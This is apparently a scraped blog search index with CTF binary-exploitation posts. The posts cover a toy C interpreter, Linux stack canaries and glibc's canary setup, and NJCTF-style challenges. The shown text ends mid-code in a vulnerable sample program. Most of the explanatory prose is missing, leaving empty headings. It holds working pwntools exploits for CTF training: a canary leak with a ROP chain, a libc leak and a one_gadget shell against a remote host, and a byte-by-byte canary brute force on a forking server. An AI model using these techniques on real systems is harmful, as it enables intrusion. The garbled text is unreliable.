want to say?\"</span>,pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":["PWN"]},{"title":"","url":"https://pz1o.top/2021/02/20//","content":"<p>d</p>\n<h1 id=\"0x01-\"><a href=\"#0x01-\" class=\"headerlink\" title=\"0x01 \"></a>0x01 </h1><h2 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1. \"></a>1. </h2><p></p>\n<ol>\n<li></li>\n<li>token</li>\n<li></li>\n</ol>\n<p></p>\n<ol>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<h2 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2. \"></a>2. </h2><p> <code>expression</code> </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;memory.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> token;            <span class=\"comment\">// current token</span></span><br><span class=\"line\"><span class=\"keyword\">char</span> *src, *old_src;  <span class=\"comment\">// pointer to source code string;</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> poolsize;         <span class=\"comment\">// default size of text/data/stack</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> <span class=\"built_in\">line</span>;             <span class=\"comment\">// line number</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">next</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    token = *src++;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">expression</span><span class=\"params\">(<span class=\"keyword\">int</span> level)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// do nothing</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">program</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    next();                  <span class=\"comment\">// get next token</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (token &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"token is: %c\\n\"</span>, token);</span><br><span class=\"line\">        next();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">eval</span><span class=\"params\">()</span> </span>&#123; <span class=\"comment\">// do nothing yet</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> **argv)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i, fd;</span><br><span class=\"line\"></span><br><span class=\"line\">    argc--;</span><br><span class=\"line\">    argv++;</span><br><span class=\"line\"></span><br><span class=\"line\">    poolsize = <span class=\"number\">256</span> * <span class=\"number\">1024</span>; <span class=\"comment\">// arbitrary size</span></span><br><span class=\"line\">    <span class=\"built_in\">line</span> = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((fd = <span class=\"built_in\">open</span>(*argv, <span class=\"number\">0</span>)) &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"could not open(%s)\\n\"</span>, *argv);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!(src = old_src = <span class=\"built_in\">malloc</span>(poolsize))) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"could not malloc(%d) for source area\\n\"</span>, poolsize);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// read the source file</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((i = <span class=\"built_in\">read</span>(fd, src, poolsize<span class=\"number\">-1</span>)) &lt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"read() returned %d\\n\"</span>, i);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    src[i] = <span class=\"number\">0</span>; <span class=\"comment\">// add EOF character</span></span><br><span class=\"line\">    <span class=\"built_in\">close</span>(fd);</span><br><span class=\"line\"></span><br><span class=\"line\">    program();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> eval();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ol>\n<li><code>next()</code> </li>\n<li><code>program()</code>  C </li>\n<li><code>expression(level)</code> </li>\n<li><code>eval()</code> </li>\n</ol>\n</blockquote>\n<p></p>\n<h1 id=\"0x02-\"><a href=\"#0x02-\" class=\"headerlink\" title=\"0x02 \"></a>0x02 </h1><p>CPU</p>\n<p>CPU </p>\n<h2 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1. \"></a>1. </h2><p></p>\n<p>32  <code>2^32 = 4G</code></p>\n<p></p>\n<ol>\n<li>text</li>\n<li>data<code>int i = 10;</code></li>\n<li>bss <code>int i[1000];</code></li>\n<li>stackcalling frame</li>\n<li>heap</li>\n</ol>\n","categories":[],"tags":["Bin"]},{"title":"Linux","url":"https://pz1o.top/2021/02/19/Linux/","content":"<h1 id=\"0x01-Canary\"><a href=\"#0x01-Canary\" class=\"headerlink\" title=\"0x01 Canary\"></a>0x01 Canary</h1><p>Canary ,cookiesCannrycannry</p>\n<h2 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1. \"></a>1. </h2><p>Cannries<code>terminator</code> <code>random</code> <code>random XOR</code></p>\n<ul>\n<li><code>Terminator canaries</code><code>\\x00</code><code>Terminator canaries</code><code>\\x00</code>CR(0x0d)LF(0x0a)EOF(0xff)</li>\n<li><code>Random canaries</code><code>/dev/urandom</code></li>\n<li><code>Random XOR canaries</code></li>\n</ul>\n<p>gcccanary</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-fstack-protector </span><br><span class=\"line\">-fstack-protector-all </span><br><span class=\"line\">-fstack-protector-strong</span><br><span class=\"line\">-fstack-protector-explicit  stack_protect attribute </span><br><span class=\"line\">-fno-stack-protector </span><br></pre></td></tr></table></figure>\n<h2 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2. \"></a>2. </h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">void main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar buf[10];</span><br><span class=\"line\">\tscanf(&quot;%s&quot;,buf);\t\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$ gcc -fstack-protector b.c -o b</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210220150601689.png\" alt=\"image-20210220150601689\"></p>\n<p></p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">disassemble main</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210220150909813.png\" alt=\"image-20210220150909813\"></p>\n<blockquote>\n<p>raxrax</p>\n<p>1.fs</p>\n<p>fs(Thread Local Stroage,TLS)TLSTLS0x28stack_guard</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;typedef struct</span><br><span class=\"line\">&gt;&#123;</span><br><span class=\"line\"> void *tcb;        &#x2F;* Pointer to the TCB.  Not necessarily the</span><br><span class=\"line\">                      thread descriptor used by libpthread.  *&#x2F;</span><br><span class=\"line\"> dtv_t *dtv;</span><br><span class=\"line\"> void *self;       &#x2F;* Pointer to the thread descriptor.  *&#x2F;</span><br><span class=\"line\"> int multiple_threads;</span><br><span class=\"line\"> uintptr_t sysinfo;</span><br><span class=\"line\"> uintptr_t stack_guard;</span><br><span class=\"line\"> ...</span><br><span class=\"line\">&gt;&#125; tcbhead_t;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p>TLS  security_init </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span></span><br><span class=\"line\">security_init (<span class=\"keyword\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">// _dl_randomkernel.</span></span><br><span class=\"line\">  <span class=\"comment\">// glibc_dl_random</span></span><br><span class=\"line\">  <span class=\"comment\">// , glibc</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">//_dl_random0x0</span></span><br><span class=\"line\">  <span class=\"keyword\">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// CanaryTLS</span></span><br><span class=\"line\">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class=\"line\"></span><br><span class=\"line\">  _dl_random = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//THREAD_SET_STACK_GUARDTLS</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> THREAD_SET_STACK_GUARD(value) \\</span></span><br><span class=\"line\">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/2.png\" alt=\"img\"></p>\n<h2 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3. \"></a>3. </h2><p></p>\n<ol>\n<li>canary</li>\n<li>TLSCanary</li>\n</ol>\n<p>gotcanary</p>\n<h2 id=\"3-1--Canary\"><a href=\"#3-1--Canary\" class=\"headerlink\" title=\"3.1  Canary\"></a>3.1  Canary</h2><p>canary\\x00canary\\x00canaryCanarycanary</p>\n<h3 id=\"1-pwn1\"><a href=\"#1-pwn1\" class=\"headerlink\" title=\"1.pwn1\"></a>1.pwn1</h3><p></p>\n<ol>\n<li>readcanary</li>\n<li>64puts</li>\n<li>one_gagdetshell</li>\n</ol>\n<p></p>\n<blockquote>\n<p>1.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;canary &#x3D; u64(r(7).rjust(8,&#39;\\x00&#39;)) </span><br></pre></td></tr></table></figure>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;canary &#x3D; u64(r(8))-0xa</span><br></pre></td></tr></table></figure>\n<p></p>\n<p>2.sl()s()</p>\n<p>sl()\\n</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\"><span class=\"comment\">#ontext.log_level='debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./babystack\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"./libc-2.232.so\"</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.200.241.244\"</span>,<span class=\"number\">41155</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./babystack\")</span></span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x0000000000400a93</span></span><br><span class=\"line\">puts_plt = elf.sym[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">main = <span class=\"number\">0x400908</span></span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">0x88</span> </span><br><span class=\"line\">sla(<span class=\"string\">'&gt;&gt; '</span>,<span class=\"string\">'1'</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p,'b *0x4009DD')</span></span><br><span class=\"line\">sla(<span class=\"string\">'&gt;&gt; '</span>,<span class=\"string\">'2'</span>)</span><br><span class=\"line\">ru(<span class=\"string\">b'A'</span>*<span class=\"number\">0x88</span>+<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">canary = u64(r(<span class=\"number\">7</span>).rjust(<span class=\"number\">8</span>,<span class=\"string\">'\\x00'</span>))  </span><br><span class=\"line\">leak(<span class=\"string\">\"canary\"</span>,canary)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">0x88</span> + p64(canary) + <span class=\"string\">b'A'</span>*<span class=\"number\">8</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class=\"line\">sla(<span class=\"string\">\"&gt;&gt; \"</span>,<span class=\"string\">'1'</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">sla(<span class=\"string\">\"&gt;&gt; \"</span>,<span class=\"string\">'3'</span>)</span><br><span class=\"line\">puts = uu64(r(<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">leak(<span class=\"string\">'puts'</span>,puts)</span><br><span class=\"line\">libc_base = puts - libc.sym[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">one_gadget = libc_base + <span class=\"number\">0x45216</span></span><br><span class=\"line\">leak(<span class=\"string\">'libc'</span>,libc_base)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">0x88</span> + p64(canary) + <span class=\"string\">b'A'</span>*<span class=\"number\">8</span> + p64(one_gadget)</span><br><span class=\"line\">sla(<span class=\"string\">\"&gt;&gt; \"</span>,<span class=\"string\">'1'</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">sla(<span class=\"string\">\"&gt;&gt; \"</span>,<span class=\"string\">'3'</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-2Forkcanary\"><a href=\"#3-2Forkcanary\" class=\"headerlink\" title=\"3.2Forkcanary\"></a>3.2Forkcanary</h2><h3 id=\"NJCTF2017messager\"><a href=\"#NJCTF2017messager\" class=\"headerlink\" title=\"NJCTF2017messager\"></a>NJCTF2017messager</h3><p></p>\n<p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221155807161.png\" alt=\"image-20210221155807161\"></p>\n<p>flagbsssocketflagsend</p>\n<p>fork400BE9</p>\n<p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221155843764.png\" alt=\"image-20210221155843764\"></p>\n<p>sub_400BE9</p>\n<blockquote>\n<p>Forkcanary</p>\n<p>canarycanaries</p>\n<p></p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level='debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak_canary</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">global</span> canary</span><br><span class=\"line\">    canary = <span class=\"string\">\"\\x00\"</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> len(canary) &lt; <span class=\"number\">8</span>:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(<span class=\"number\">256</span>):</span><br><span class=\"line\">            p = process(<span class=\"string\">\"./messager\"</span>)</span><br><span class=\"line\">            p.recv()</span><br><span class=\"line\">            p.send(<span class=\"string\">\"A\"</span>*<span class=\"number\">104</span> + canary + chr(i))</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                p.recv()</span><br><span class=\"line\">                canary +=chr(x)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">                p.close()</span><br><span class=\"line\">    leak(<span class=\"string\">\"canary\"</span>,canary)</span><br><span class=\"line\">leak_canary()</span><br><span class=\"line\">p = process(<span class=\"string\">\"./messager\"</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">s(<span class=\"string\">\"A\"</span>*<span class=\"number\">104</span>+canary+<span class=\"string\">\"A\"</span>*<span class=\"number\">8</span>+p64(<span class=\"number\">0x400bc6</span>))</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h3 id=\"forkgetshell\"><a href=\"#forkgetshell\" class=\"headerlink\" title=\"forkgetshell\"></a>forkgetshell</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/wait.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">backdoor</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">    system(<span class=\"string\">\"/bin/sh\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    setbuf(<span class=\"built_in\">stdin</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    setbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    setbuf(<span class=\"built_in\">stderr</span>, 